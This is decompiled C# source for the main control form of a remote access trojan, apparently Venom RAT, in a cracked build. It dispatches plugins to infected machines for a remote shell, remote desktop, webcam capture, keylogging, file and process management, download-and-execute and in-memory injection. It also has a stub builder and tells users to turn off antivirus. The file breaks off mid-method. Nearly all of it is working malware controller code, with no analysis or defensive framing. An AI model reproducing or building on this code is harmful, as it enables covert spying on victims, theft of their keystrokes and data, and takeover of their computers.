using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using cGeoIp;
using HVNC;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;
using Siticone.Desktop.UI.WinForms;

namespace Server
{
	// Token: 0x02000025 RID: 37
	public partial class FormMain : Form
	{
		// Token: 0x0600014C RID: 332 RVA: 0x00002B26 File Offset: 0x00000D26
		public FormMain()
		{
			this.InitializeComponent();
			FormMain.SetWindowTheme(this.listView1.Handle, "explorer", null);
			base.Opacity = 0.0;
		}

		// Token: 0x0600014D RID: 333 RVA: 0x000118CC File Offset: 0x0000FACC
		private void CheckFiles()
		{
			try
			{
				if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
				{
					MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
					Environment.Exit(0);
				}
				if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Client.exe")))
				{
					MessageBox.Show("Missing client file,please close the Anti-virus and unzip again.");
				}
				if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
				{
					Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
				}
				if (!File.Exists(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db")))
				{
					File.WriteAllBytes(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db"), Resources.ip2region);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Cracked by Alkaisa", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600014E RID: 334 RVA: 0x000119DC File Offset: 0x0000FBDC
		private Clients[] GetSelectedClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.SelectedItems.Count != 0)
					{
						foreach (object obj in this.listView1.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x0600014F RID: 335 RVA: 0x00011A20 File Offset: 0x0000FC20
		private Clients[] GetAllClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.Items.Count != 0)
					{
						foreach (object obj in this.listView1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x06000150 RID: 336 RVA: 0x00011A64 File Offset: 0x0000FC64
		private void Connect()
		{
			FormMain.<Connect>d__9 <Connect>d__;
			<Connect>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Connect>d__.<>1__state = -1;
			<Connect>d__.<>t__builder.Start<FormMain.<Connect>d__9>(ref <Connect>d__);
		}

		// Token: 0x06000151 RID: 337 RVA: 0x00011A94 File Offset: 0x0000FC94
		private void Form1_Load(object sender, EventArgs e)
		{
			FormMain.<Form1_Load>d__10 <Form1_Load>d__;
			<Form1_Load>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Form1_Load>d__.<>4__this = this;
			<Form1_Load>d__.<>1__state = -1;
			<Form1_Load>d__.<>t__builder.Start<FormMain.<Form1_Load>d__10>(ref <Form1_Load>d__);
		}

		// Token: 0x06000152 RID: 338 RVA: 0x00002B65 File Offset: 0x00000D65
		private void Form1_Activated(object sender, EventArgs e)
		{
			if (this.trans)
			{
				base.Opacity = 1.0;
			}
		}

		// Token: 0x06000153 RID: 339 RVA: 0x00002B7E File Offset: 0x00000D7E
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			base.Opacity = 0.95;
		}

		// Token: 0x06000154 RID: 340 RVA: 0x00002B8F File Offset: 0x00000D8F
		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x06000155 RID: 341 RVA: 0x00011ACC File Offset: 0x0000FCCC
		private void listView1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.listView1.Items.Count > 0 && e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
			{
				foreach (object obj in this.listView1.Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
		}

		// Token: 0x06000156 RID: 342 RVA: 0x00011B54 File Offset: 0x0000FD54
		private void listView1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.listView1.Items.Count > 1)
			{
				ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
				if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
				{
					this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
				}
			}
		}

		// Token: 0x06000157 RID: 343 RVA: 0x00011BC4 File Offset: 0x0000FDC4
		private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			if (e.Column == this.lvwColumnSorter.SortColumn)
			{
				if (this.lvwColumnSorter.Order == SortOrder.Ascending)
				{
					this.lvwColumnSorter.Order = SortOrder.Descending;
				}
				else
				{
					this.lvwColumnSorter.Order = SortOrder.Ascending;
				}
			}
			else
			{
				this.lvwColumnSorter.SortColumn = e.Column;
				this.lvwColumnSorter.Order = SortOrder.Ascending;
			}
			this.listView1.Sort();
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00011C38 File Offset: 0x0000FE38
		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			if (Settings.Default.Notification)
			{
				Settings.Default.Notification = false;
				this.toolStripStatusLabel1.ForeColor = Color.Silver;
			}
			else
			{
				Settings.Default.Notification = true;
				this.toolStripStatusLabel1.ForeColor = Color.Silver;
			}
			Settings.Default.Save();
		}

		// Token: 0x06000159 RID: 345 RVA: 0x00011C94 File Offset: 0x0000FE94
		private void ping_Tick(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = "This is a ping!";
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack.Encode2Bytes());
				}
				GC.Collect();
			}
		}

		// Token: 0x0600015A RID: 346 RVA: 0x00011D18 File Offset: 0x0000FF18
		private void UpdateUI_Tick(object sender, EventArgs e)
		{
			this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
			object lockListviewClients = Settings.LockListviewClients;
			lock (lockListviewClients)
			{
				this.toolStripStatusLabel1.Text = string.Format("- Online - {0}                                                     - Selected - {1}                                                                    - Sent - {2}                                                     - Received -  {3}                                                                    - CPU - {4}%                                                     - Memory - {5}%", new object[]
				{
					this.listView1.Items.Count.ToString(),
					this.listView1.SelectedItems.Count.ToString(),
					Methods.BytesToString(Settings.SentValue).ToString(),
					Methods.BytesToString(Settings.ReceivedValue).ToString(),
					(int)this.performanceCounter1.NextValue(),
					(int)this.performanceCounter2.NextValue()
				});
			}
		}

		// Token: 0x0600015B RID: 347 RVA: 0x00011E10 File Offset: 0x00010010
		private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				object lockListviewLogs = Settings.LockListviewLogs;
				lock (lockListviewLogs)
				{
					this.listView2.Items.Clear();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600015C RID: 348 RVA: 0x00011E74 File Offset: 0x00010074
		private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00011F2C File Offset: 0x0001012C
		private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
					foreach (object obj in this.listView3.Items)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj).Tag).Send), msgPack.Encode2Bytes());
					}
				}
				this.listView3.Items.Clear();
				this.ThumbnailImageList.Images.Clear();
				foreach (object obj2 in this.listView1.Items)
				{
					((Clients)((ListViewItem)obj2).Tag).LV2 = null;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00012058 File Offset: 0x00010258
		private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView4.SelectedItems.Count > 0)
			{
				foreach (object obj in this.listView4.SelectedItems)
				{
					((ListViewItem)obj).Remove();
				}
			}
		}

		// Token: 0x0600015F RID: 351 RVA: 0x000120C8 File Offset: 0x000102C8
		private void TimerTask_Tick(object sender, EventArgs e)
		{
			FormMain.<TimerTask_Tick>d__24 <TimerTask_Tick>d__;
			<TimerTask_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<TimerTask_Tick>d__.<>4__this = this;
			<TimerTask_Tick>d__.<>1__state = -1;
			<TimerTask_Tick>d__.<>t__builder.Start<FormMain.<TimerTask_Tick>d__24>(ref <TimerTask_Tick>d__);
		}

		// Token: 0x06000160 RID: 352 RVA: 0x00012100 File Offset: 0x00010300
		private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("Update").AsString = "false";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000161 RID: 353 RVA: 0x00012310 File Offset: 0x00010510
		private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000162 RID: 354 RVA: 0x00012578 File Offset: 0x00010778
		private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
					msgPack.ForcePathObject("Update").AsString = "true";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000163 RID: 355 RVA: 0x00012788 File Offset: 0x00010988
		private bool GetListview(string id)
		{
			using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ListViewItem)enumerator.Current).ToolTipText == id)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x06000164 RID: 356 RVA: 0x000127F8 File Offset: 0x000109F8
		private void SetExecution(string id)
		{
			foreach (object obj in Program.form1.listView4.Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (listViewItem.ToolTipText == id)
				{
					int num = Convert.ToInt32(listViewItem.SubItems[1].Text);
					num++;
					listViewItem.SubItems[1].Text = num.ToString();
				}
			}
		}

		// Token: 0x06000165 RID: 357
		[DllImport("uxtheme", CharSet = CharSet.Unicode)]
		public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

		// Token: 0x06000166 RID: 358 RVA: 0x00012894 File Offset: 0x00010A94
		private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (FormBuilder formBuilder = new FormBuilder())
			{
				formBuilder.ShowDialog();
			}
		}

		// Token: 0x06000167 RID: 359 RVA: 0x000128CC File Offset: 0x00010ACC
		private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shell";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
					{
						new FormShell
						{
							Name = "shell:" + clients.ID,
							Text = "shell:" + clients.ID,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000168 RID: 360 RVA: 0x00012A04 File Offset: 0x00010C04
		private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
					{
						new FormRemoteDesktop
						{
							Name = "RemoteDesktop:" + clients.ID,
							F = this,
							Text = "RemoteDesktop:" + clients.ID,
							ParentClient = clients,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000169 RID: 361 RVA: 0x00012B24 File Offset: 0x00010D24
		private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
					foreach (Clients clients in this.GetSelectedClients())
					{
						if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
						{
							new FormWebcam
							{
								Name = "Webcam:" + clients.ID,
								F = this,
								Text = "Webcam:" + clients.ID,
								ParentClient = clients,
								FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera")
							}.Show();
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00012C64 File Offset: 0x00010E64
		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
					{
						new FormFileManager
						{
							Name = "fileManager:" + clients.ID,
							Text = "fileManager:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID)
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600016B RID: 363 RVA: 0x00012D78 File Offset: 0x00010F78
		private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
					{
						new FormProcessManager
						{
							Name = "processManager:" + clients.ID,
							Text = "processManager:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00012E78 File Offset: 0x00011078
		private void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FormMain.<SendFileToDiskToolStripMenuItem_Click>d__37 <SendFileToDiskToolStripMenuItem_Click>d__;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SendFileToDiskToolStripMenuItem_Click>d__.<>4__this = this;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>1__state = -1;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>t__builder.Start<FormMain.<SendFileToDiskToolStripMenuItem_Click>d__37>(ref <SendFileToDiskToolStripMenuItem_Click>d__);
		}

		// Token: 0x0600016D RID: 365 RVA: 0x00012EB0 File Offset: 0x000110B0
		private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.IsOK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600016E RID: 366 RVA: 0x00013020 File Offset: 0x00011220
		private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "Controlled by Venom RAT", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
					msgPack.ForcePathObject("Message").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600016F RID: 367 RVA: 0x0001311C File Offset: 0x0001131C
		private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
					msgPack.ForcePathObject("URL").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000170 RID: 368 RVA: 0x00013218 File Offset: 0x00011418
		private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					using (OpenFileDialog openFileDialog = new OpenFileDialog())
					{
						openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
						if (openFileDialog.ShowDialog() == DialogResult.OK)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
							msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
							msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
							msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
							msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
							Clients[] selectedClients = this.GetSelectedClients();
							for (int i = 0; i < selectedClients.Length; i++)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000171 RID: 369 RVA: 0x00013378 File Offset: 0x00011578
		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Logger.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
					{
						new FormKeylogger
						{
							Name = "keyLogger:" + clients.ID,
							Text = "keyLogger:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000172 RID: 370 RVA: 0x00013490 File Offset: 0x00011690
		private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Alert when process activive.", "Title 标题", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					object lockReportWindowClients = Settings.LockReportWindowClients;
					lock (lockReportWindowClients)
					{
						Settings.ReportWindowClients.Clear();
						Settings.ReportWindowClients = new List<Clients>();
					}
					Settings.ReportWindow = true;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
					msgPack.ForcePathObject("Option").AsString = "run";
					msgPack.ForcePathObject("Title").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000173 RID: 371 RVA: 0x00013600 File Offset: 0x00011800
		private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				Settings.ReportWindow = false;
				MsgPack msgPack = new MsgPack();
